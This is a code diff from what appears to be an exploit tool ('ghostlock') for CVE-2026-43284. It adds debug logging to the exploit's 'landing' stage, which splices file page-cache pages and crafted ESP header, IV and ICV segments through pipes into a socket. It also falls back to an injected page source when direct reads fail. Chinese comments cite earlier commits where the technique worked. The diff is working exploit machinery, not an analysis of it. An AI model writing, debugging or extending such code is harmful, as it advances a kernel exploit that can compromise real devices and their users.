@@ -18,6 +18,7 @@
 #include "backend/cve_2026_43284/landing/real_splice_io.hpp"
 
 #include "backend/cve_2026_43284/landing/esp_crypto.hpp"
+#include "jni/gl_log.hpp"
 
 #include <cerrno>
 #include <cstddef>
@@ -168,6 +169,9 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         if (out == nullptr || size == 0U) {
             return -EINVAL;
         }
+        /* 读的入口（成功历史：pagecache.cpp:116-166 —— 那边先直接 pread，读不满才走注入来源）。 */
+        GL_LOGI("splice read_at: fd=%d len=%zu offset=%llu", fd, size,
+                static_cast<unsigned long long>(offset));
         long direct = -EBADF;
         if (fd >= 0) {
             std::size_t done = 0U;
@@ -196,14 +200,20 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 done += got;
             }
             if (!failed) {
+                GL_LOGI("splice read_at: direct ok fd=%d len=%zu offset=%llu", fd, size,
+                        static_cast<unsigned long long>(offset));
                 return static_cast<long>(size);
             }
         }
         /* The bound source is consulted only when the direct read could not finish, and only for
          * the block it provides; it is all-or-nothing, so the caller checks the count it returns. */
         if (size == kBlockBytes && old_page_.available()) {
+            GL_LOGI("splice read_at: bridge fd=%d offset=%llu (direct code=%ld)",
+                    fd, static_cast<unsigned long long>(offset), direct);
             return old_page_.read16(old_page_.ctx, offset, out);
         }
+        GL_LOGI("splice read_at: direct failed fd=%d len=%zu offset=%llu code=%ld", fd, size,
+                static_cast<unsigned long long>(offset), direct);
         return direct;
     }
 
@@ -225,17 +235,29 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             last_error_ = 4;
             return false; /* No ciphertext source, so there is no datagram. */
         }
+        /* 发送的入口（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:208-251
+         *  —— 那边 pipe2 后依次 vmsplice(header+iv)、splice(页)、vmsplice(icv)，最后 splice(pipe→socket)；
+         *  页与 icv 的长度决定 total，短一字节就是短写）。 */
+        GL_LOGI("splice_one: socket=%d size=%zu offset=%llu before_page=%zu page=%zu file_fd=%d helper=%d",
+                socket_fd, size, static_cast<unsigned long long>(offset), kBeforePageBytes, kBlockBytes,
+                file_fd_, helper_.available() ? 1 : 0);
         int fds[2] = {-1, -1};
         if (io_.pipe2(fds, pipe_flags_) != 0) {
             last_error_ = 10;
             return false;
         }
+        GL_LOGI("splice_one: pipe=[%d,%d] flags=0x%x", fds[0], fds[1], static_cast<unsigned>(pipe_flags_));
         bool sent_ok = false;
         for (;;) {
+            GL_LOGI("splice_one: segment hdr+vector=%zu -> pipe=%d", kBeforePageBytes, fds[1]);
             if (!vmsplice_all(io_, fds[1], datagram, kBeforePageBytes)) { last_error_ = 20; break; }
             if (file_fd_ >= 0) {
                 std::uint64_t cursor = offset;
+                GL_LOGI("splice_one: segment page in_fd=%d -> pipe=%d len=%zu at=%llu",
+                        file_fd_, fds[1], kBlockBytes, static_cast<unsigned long long>(offset));
                 if (!splice_span(io_, file_fd_, &cursor, fds[1], kBlockBytes)) { last_error_ = 21; break; }
+                GL_LOGI("splice_one: page spliced=%llu want=%zu cursor=%llu",
+                        cursor - offset, kBlockBytes, static_cast<unsigned long long>(cursor));
             } else {
                 const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
                 /* 并排事实：helper 送进管道的块数，以及经同一来源读该处会得到的前 4 字节。 */
@@ -251,13 +273,19 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 if (spliced != static_cast<long>(kBlockBytes)) { last_error_ = 22; break; }
             }
             const std::size_t suffix = size - kMinDatagramBytes;
+            GL_LOGI("splice_one: segment icv=%zu (prefix=%zu)", suffix, kMinDatagramBytes);
             if (!vmsplice_all(io_, fds[1], datagram + kMinDatagramBytes, suffix)) { last_error_ = 23; break; }
             const long sent = splice_one_datagram(io_, fds[0], socket_fd, size);
+            GL_LOGI("splice_one: datagram sent=%ld want=%zu pipe=%d socket=%d",
+                    sent, size, fds[0], socket_fd);
             if (sent != static_cast<long>(size)) { last_error_ = sent < 0 ? static_cast<int>(sent) : 24; break; }
             sent_ok = true;
             break;
         }
         close_pair(io_, fds);
+        /* 结果（成功历史：pagecache.cpp:246-250 —— 那边 sent < 0 或 sent != total 都算失败）。 */
+        GL_LOGI("splice_one: done ok=%d last_error=%d (0=no failure, 10=pipe, 20=hdr, 21=page, 22=helper, 23=icv, 24=short)",
+                sent_ok ? 1 : 0, sent_ok ? 0 : last_error_);
         return sent_ok;
     }
 
